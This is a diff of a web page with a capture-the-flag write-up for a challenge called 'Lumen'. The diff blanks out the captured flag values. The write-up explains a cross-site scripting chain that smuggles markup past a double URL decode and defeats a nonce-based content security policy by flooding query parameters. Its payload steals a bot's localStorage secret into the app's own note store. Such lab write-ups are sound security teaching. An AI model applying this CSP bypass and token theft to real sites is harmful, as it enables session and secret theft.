@@ -74,7 +74,7 @@
         <p class="masthead-meta">
           <span>Challenge 13 of 15</span>
           <span>Web</span>
-          <span class="live">Solved · 100 pts</span>
+          <span class="live">Full writeup</span>
         </p>
       </div>
       <div class="hero-deck">
@@ -84,7 +84,6 @@
           <p class="deck">Lumen is a read-only document relay with a content security policy locked down on every page, so the operator is confident that even a stray reflection cannot run. Sign in is not your problem. The operator is, and the operator keeps something valuable in their browser. Find the reflection, get it to run despite the policy, and convince the operator to hand it over.</p>
           <p class="wu-meta">
             <span class="cat cat-web">Web</span><span class="sep">·</span>
-            <span>100 points</span><span class="sep">·</span>
             <span>4 November 2026</span>
           </p>
         </div>
@@ -97,7 +96,7 @@
       <div class="wu-layout">
         <article class="wu" data-reveal>
           <div class="tldr"><p class="lab">TL;DR</p><p>A &lt; is smuggled into the ?p=view 404 reflection across the dir/file parameter boundary, because <code>index.php</code> calls <code>urldecode()</code> on the concatenation after each half was sanitised separately; the strict per-request nonce CSP is then deleted entirely by sending &gt;1000 query parameters, which makes PHP print a max_input_vars request-startup warning before the script runs, so header("Content-Security-Policy: ...") fails with "headers already sent". The resulting unrestricted onerror handler reads the operator bot's localStorage.flag and posts it to the app's own ?p=trace note store, which the attacker reads back.</p></div>
-          <div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{406d825cc9c3e881efbaa597ad7591c2}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{9cd8ce279fbb943f041641905360ca1c}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><p class="flag-note">Instances are provisioned per run, so these are the values our instances returned.</p>
+          <div class="flagbox"><span class="lab">Captured</span></div>
           <section id="recon"><h2><span class="hn">01</span>Recon</h2><p>The <code>web_lumen.zip</code> handout contains the whole app:</p>
 <figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>web_lumen/Dockerfile
 web_lumen/docker-compose.local.yml
@@ -164,7 +163,7 @@ p=trace&amp;id=lumenpwn01&amp;note='+encodeURIComponent(localStorage.getItem('fl
 <ol class="steps" start="5"><li>Collect. The payload's new Image().src writes the flag to TRACE_DIR/lumenpwn01. Poll:</li></ol>
 <figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>   GET /?p=trace&amp;id=lumenpwn01     -&gt;    &lt;div class="card"&gt;&lt;h1&gt;delivery trace&lt;/h1&gt;&lt;pre&gt;BHFlagY{...}&lt;/pre&gt;&lt;/
 div&gt;</code></pre></figure>
-<ol class="steps" start="6"><li>Result. Local container returned the placeholder BHFlagY{local_test_flag} (no <code>/flag.txt</code>, falls back to DYN_FLAG). Against the live instances, one run each:</li><li>http://k85c055eb8836a37c0d581c3dc51ab1c2.playat.flagyard.com → BHFlagY{406d825cc9c3e881efbaa597ad7591c2}</li><li>http://k9bade1ac79139f00d48a9813d1318e9e.playat.flagyard.com → BHFlagY{9cd8ce279fbb943f041641905360ca1c}</li></ol>
+<ol class="steps" start="6"><li>Result. Local container returned the placeholder BHFlagY{local_test_flag} (no <code>/flag.txt</code>, falls back to DYN_FLAG). Against the live instances, one run each:</li><li>http://k85c055eb8836a37c0d581c3dc51ab1c2.playat.flagyard.com → BHFlagY{...}</li><li>http://k9bade1ac79139f00d48a9813d1318e9e.playat.flagyard.com → BHFlagY{...}</li></ol>
 <p>Full one-shot script: <code>/home/kali/Desktop/CTF/web/Lumen/exploit.py</code> &lt;base-url&gt;</p>
 <p class="codelabel">Key code TRACE_ID = "lumenpwn01"</p>
 <figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">python</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>def dbl(s): # survives $_GET's decode, then index.php's urldecode()
